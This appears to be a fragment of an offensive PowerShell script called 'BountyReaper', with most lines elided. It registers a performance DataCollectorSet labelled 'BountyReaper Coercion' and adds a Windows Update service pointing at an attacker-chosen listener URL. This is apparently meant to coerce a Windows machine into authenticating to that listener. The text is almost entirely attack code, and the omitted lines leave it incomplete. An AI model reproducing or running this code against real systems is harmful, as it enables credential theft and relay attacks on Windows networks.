...
<description>BountyReaper</description>
...
<DataCollectorSet>
    ...
    <Description>BountyReaper Coercion</Description>
</DataCollectorSet>
"@

    $dcom.SetXml($xml)
    $dcom.Commit("BountyReaper", $null, 0x0003) | Out-Null
...
try {
    ...
    try {
        ...
        $manager.AddService2("BountyReaper", 2, "https://${listener}:${port}/wsus")
